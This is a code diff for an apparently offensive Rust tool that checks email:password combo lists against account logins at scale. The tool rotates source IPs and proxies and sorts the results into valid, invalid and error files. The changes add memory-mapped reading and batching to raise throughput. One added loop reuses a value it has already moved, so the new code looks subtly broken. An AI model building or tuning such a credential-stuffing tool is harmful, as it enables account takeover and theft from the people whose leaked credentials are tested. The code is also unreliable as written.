@@ -27,7 +27,7 @@ use std::fs::{File, OpenOptions};
 use std::io::{BufRead, BufReader, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
-use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
@@ -157,7 +157,7 @@ static SRC_IPS: Lazy<Vec<IpAddr>> = Lazy::new(|| {
     ]
 });
 static SRC_IDX: AtomicUsize = AtomicUsize::new(0);
-#[inline]
+#[inline(always)]
 fn next_source_ip() -> IpAddr {
     let i = SRC_IDX.fetch_add(1, Ordering::Relaxed);
     SRC_IPS[i % SRC_IPS.len()]
@@ -411,24 +411,25 @@ fn make_table(stats: &Stats, start: Instant) {
     );
 }
 
+#[repr(align(64))]
 struct Stats {
-    total: AtomicUsize,
-    checked: AtomicUsize,
-    valid: AtomicUsize,
-    invalid: AtomicUsize,
-    errors: AtomicUsize,
-    retries: AtomicUsize,
+    total: AtomicU64,
+    checked: AtomicU64,
+    valid: AtomicU64,
+    invalid: AtomicU64,
+    errors: AtomicU64,
+    retries: AtomicU64,
 }
 
 impl Stats {
     fn new() -> Self {
         Self {
-            total: AtomicUsize::new(0),
-            checked: AtomicUsize::new(0),
-            valid: AtomicUsize::new(0),
-            invalid: AtomicUsize::new(0),
-            errors: AtomicUsize::new(0),
-            retries: AtomicUsize::new(0),
+            total: AtomicU64::new(0),
+            checked: AtomicU64::new(0),
+            valid: AtomicU64::new(0),
+            invalid: AtomicU64::new(0),
+            errors: AtomicU64::new(0),
+            retries: AtomicU64::new(0),
         }
     }
 }
@@ -436,7 +437,7 @@ impl Stats {
 // ---------------------------------------------------------------------------
 // Consumer factory remains, queue capacity bumped (ENH#10)
 fn create_consumer(
-    mut rx: Receiver<(String, String)>,
+    mut rx: Receiver<Vec<(String, String)>>,
     stats: Arc<Stats>,
     cfg: Arc<Config>,
     proxies: ProxyPool,
@@ -445,11 +446,12 @@ fn create_consumer(
     mut error_f: File,
 ) -> JoinHandle<()> {
     tokio::spawn(async move {
-        while let Some((email, pwd)) = rx.recv().await {
-            let domain = email.split('@').nth(1).unwrap_or("");
-            let mut ok = false;
-            let mut net_err = true;
-            let matrix = cfg.matrix(domain);
+        while let Some(batch) = rx.recv().await {
+            for (email, pwd) in batch {
+                let domain = email.split('@').nth(1).unwrap_or("");
+                let mut ok = false;
+                let mut net_err = true;
+                let matrix = cfg.matrix(domain);
 
             for retry in 0..=cfg.max_retries {
                 let proxy = proxies.next();
@@ -496,16 +498,17 @@ fn create_consumer(
                 .await;
             }
 
-            stats.checked.fetch_add(1, Ordering::Relaxed);
-            if ok {
-                stats.valid.fetch_add(1, Ordering::Relaxed);
-                writeln!(valid_f, "{}:{}", email, pwd).ok();
-            } else if net_err {
-                stats.errors.fetch_add(1, Ordering::Relaxed);
-                writeln!(error_f, "{}:{}", email, pwd).ok();
-            } else {
-                stats.invalid.fetch_add(1, Ordering::Relaxed);
-                writeln!(invalid_f, "{}:{}", email, pwd).ok();
+                stats.checked.fetch_add(1, Ordering::Relaxed);
+                if ok {
+                    stats.valid.fetch_add(1, Ordering::Relaxed);
+                    writeln!(valid_f, "{}:{}", email, pwd).ok();
+                } else if net_err {
+                    stats.errors.fetch_add(1, Ordering::Relaxed);
+                    writeln!(error_f, "{}:{}", email, pwd).ok();
+                } else {
+                    stats.invalid.fetch_add(1, Ordering::Relaxed);
+                    writeln!(invalid_f, "{}:{}", email, pwd).ok();
+                }
             }
         }
     })
@@ -630,7 +633,7 @@ async fn run_validator(cfg: Arc<Config>) {
     let stats = Arc::new(Stats::new());
 
     // ENH#10 4× concurrency channel depth
-    let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
+    let (tx, rx) = mpsc::channel::<Vec<(String, String)>>(cfg.concurrency * 4);
 
     // Spawn consumers
     let mut jobs: Vec<JoinHandle<()>> = Vec::new();
@@ -651,15 +654,41 @@ async fn run_validator(cfg: Arc<Config>) {
         let stats = stats.clone();
         let cfg = cfg.clone();
         async move {
-            let file = File::open(&cfg.input_file).expect("Input file not found");
-            for line in BufReader::new(file).lines().flatten() {
-                if !line.contains(':') { continue; }
-                let (email, pwd) = {
-                    let mut iter = line.splitn(2, ':');
-                    (iter.next().unwrap().to_string(), iter.next().unwrap().to_string())
-                };
-                stats.total.fetch_add(1, Ordering::Relaxed);
-                tx.send((email, pwd)).await.unwrap();
+            let file = std::fs::File::open(&cfg.input_file).expect("Input file not found");
+            let mmap = unsafe { memmap2::Mmap::map(&file).expect("mmap failed") };
+            let bytes = &mmap[..];
+            let mut start = 0usize;
+            let mut batch: Vec<(String, String)> = Vec::with_capacity(64);
+            for nl in memchr::memchr_iter(b'\n', bytes) {
+                let line = &bytes[start..nl];
+                start = nl + 1;
+                if line.is_empty() { continue; }
+                if let Some(pos) = memchr::memchr(b':', line) {
+                    let email = String::from_utf8_lossy(&line[..pos]).to_string();
+                    let pwd = String::from_utf8_lossy(&line[pos+1..]).to_string();
+                    batch.push((email, pwd));
+                    stats.total.fetch_add(1, Ordering::Relaxed);
+                    if batch.len() >= 64 {
+                        let mut out = Vec::new();
+                        std::mem::swap(&mut out, &mut batch);
+                        while tx.try_send(out).is_err() {
+                            tokio::task::yield_now().await;
+                        }
+                        batch = Vec::with_capacity(64);
+                    }
+                }
+            }
+            if start < bytes.len() {
+                let line = &bytes[start..];
+                if let Some(pos) = memchr::memchr(b':', line) {
+                    let email = String::from_utf8_lossy(&line[..pos]).to_string();
+                    let pwd = String::from_utf8_lossy(&line[pos+1..]).to_string();
+                    batch.push((email, pwd));
+                    stats.total.fetch_add(1, Ordering::Relaxed);
+                }
+            }
+            if !batch.is_empty() {
+                tx.send(batch).await.ok();
             }
         }
     });
